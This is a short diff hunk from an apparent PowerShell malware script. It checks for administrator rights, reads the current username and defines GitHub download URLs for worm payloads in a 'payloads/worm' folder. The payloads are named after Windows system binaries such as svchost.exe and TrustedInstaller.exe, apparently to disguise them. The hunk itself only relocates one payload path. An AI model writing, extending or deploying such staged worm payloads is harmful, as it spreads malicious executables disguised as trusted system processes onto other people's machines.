@@ -8,7 +8,7 @@ if(-not (([System.Security.Principal.WindowsPrincipal][System.Security.Principal
 $user = ((Get-CimInstance -ClassName Win32_ComputerSystem).UserName -split '\\')[-1]
 $initServiceRootmonmonUri = "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/payloads/init_service_rootmonmon.ps1"
 $initServiceFwdmonUri = "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/payloads/init_service_fwdmon.ps1"
-$initFinde = "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/payloads/finde.exe"
+$initFinde = "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/payloads/worm/finde.exe"
 $ftpUrl = "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/payloads/worm/TrustedInstaller.exe"
 $serverUrl = "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/payloads/worm/RuntimeBrokerHelper.exe"
 $usbUrl = "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/payloads/worm/svchost.exe"
